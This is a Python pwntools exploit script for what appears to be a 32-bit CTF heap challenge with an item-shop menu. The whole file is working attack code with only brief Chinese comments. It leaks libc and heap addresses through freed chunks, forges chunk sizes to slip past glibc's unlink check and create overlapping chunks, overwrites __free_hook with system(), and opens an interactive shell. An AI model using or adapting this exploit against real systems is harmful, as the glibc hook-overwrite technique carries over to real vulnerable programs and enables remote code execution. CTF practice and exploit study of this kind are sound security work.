#coding=utf-8
from pwn import *
local = 1
context.terminal=["tmux","splitw","-h"]
elf=ELF("./pwn")
if local:
    a=process("./pwn")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("",)
    libc=ELF("")
def debug():
    gdb.attach(a,'''
    b *(0x56555000+0x0000BFA)
    b *(0x56555000+0x00000D4B)
    b *(0x56555000+0x0000EA7)
    b *(0x56555000+0x000118F)
    b *(0x00012BA+0x56555000)
    ''')
def menu(idx):
    a.recvuntil(">>> ")
    a.sendline(str(idx))

def add(size,name,price):
    menu(1)
    a.recvuntil("Name length: ")
    a.sendline(str(size))
    a.recvuntil("Name: ")
    a.send(name)
    a.recvuntil("Price: ")
    a.sendline(str(price))

def delete(idx):
    menu(3)
    a.recvuntil("WHICH IS THE RUBBISH PC? Give me your index: ")
    a.sendline(str(idx))

def comment(idx,com,s):
    menu(2)
    a.recvuntil("Index: ")
    a.sendline(str(idx))
    a.recvuntil("Comment on ")
    name=a.recvuntil(" : ",drop=True)
    a.send(com)
    a.recvuntil("And its score: ")
    a.sendline(str(s))

def rename(idx,content,s):
    menu(4)
    a.recvuntil("Give me an index: ")
    a.sendline(str(idx))
    sleep(0.1)
    a.send(content)
    a.recvuntil("Wanna get more power?(y/n)")
    a.sendline("y")
    a.recvuntil(": ")
    a.sendline("e4SyD1C!")
    a.recvuntil("y Pwner")
    a.sendline(s)
    
add(0x10,'A\n',10)#0
comment(0,'A',10)

add(0x10,'A\n',10)#1
delete(0)
comment(1,"A"*4,10)
delete(1)
a.recvuntil("A"*4)
libc_base=u32(a.recv(4))-48-libc.symbols["__malloc_hook"]-0x18
success("libc_base ==> 0x%x"%libc_base)
#debug()
__free_hook=libc_base+libc.symbols["__free_hook"]
system_addr=libc_base+libc.symbols["system"]
add(0x8c,'/bin/sh\x00\n',10)#0 清空unsorted bin
add(0x14,'A\n',10)#1

add(0xfc,'/bin/sh\x00'+'\n',10)#2 name chunk -> 0x56559120
add(0xfc,'/bin/sh\x00'+'\n',10)#3 info chunk -> 0x56559220 name_chunk -> 0x56559238
delete(1)
add(0xfc,"A\n",10)#1  0x56559320
add(0xfc,'A\n',10)#4  
add(0x8c,'A\n',10)#5 用来free到 unsorted bin 中，然后泄露heap
add(0x14,'A\n',10)#6 防止合并
#debug()
delete(1)
add(0xfc,'/bin/sh\x00'+'A'*0xf0+p32(0x300+0x18)+'\n',10)#4
#debug()
delete(5)
delete(2)#绕过unlink检查
delete(4)#合并

comment(0,'A'*4,10)
delete(0)
a.recvuntil("A"*4)
heap_base=u32(a.recv(4))-0x120
success("heap_base ==> 0x%x"%heap_base)
payload='A'*0xe8+p32(0)+p32(0xa8+1)+'A'*8
payload+=p32(0)+p32(0x18+1)+'AAA\x00'
payload+=p32(heap_base+0x218)
payload+=p32(0x21)*40+'\n'
#debug()
add(0x1fc,payload,0x10)
rename(3,p32(__free_hook)*6,p32(system_addr))

a.interactive()